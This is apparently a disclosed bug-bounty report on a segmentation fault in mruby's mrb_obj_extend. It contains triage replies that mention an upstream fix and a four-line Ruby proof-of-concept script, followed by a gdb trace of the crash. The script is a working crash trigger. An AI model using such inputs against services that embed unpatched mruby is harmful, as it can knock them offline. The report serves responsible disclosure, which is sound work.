title: SIGSEGV - mrb_obj_extend - line:413

activities.message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!
activities.markdown_message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!

activities.message: Thank you for your report. We've reproduced the issue and opened a report upstream: https://github.com/mruby/mruby/issues/3419
activities.markdown_message: Thank you for your report. We've reproduced the issue and opened a report upstream: https://github.com/mruby/mruby/issues/3419

activities.message:
Thanks again for your report. This issue was recently fixed upstream in https://github.com/mruby/mruby/commit/bf4e79cc62af809138bc7db7e54ece67080b5fa8

Our next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.
activities.markdown_message:
Thanks again for your report. This issue was recently fixed upstream in https://github.com/mruby/mruby/commit/bf4e79cc62af809138bc7db7e54ece67080b5fa8

Our next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.

activities.message: Thanks for helping improve the security of the Mruby Project!
activities.markdown_message: Thanks for helping improve the security of the Mruby Project!

vulnerability_information_html:
PoC:

The following code triggers the bug (attached as test_mrb_obj_extend_413.rb):

module Test end
def method_missing(s)extend(Test)end
def set(v)a.set(0)end
set(0)

Mirb - Debug:

(gdb) r test_mrb_obj_extend_413.rb 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/x/Desktop/research/test_2/mruby/bin/mirb test_mrb_obj_extend_413.rb
mirb - Embeddable Interactive Ruby Shell

 => :method_missing
 => :set

Program received signal SIGSEGV, Segmentation fault.
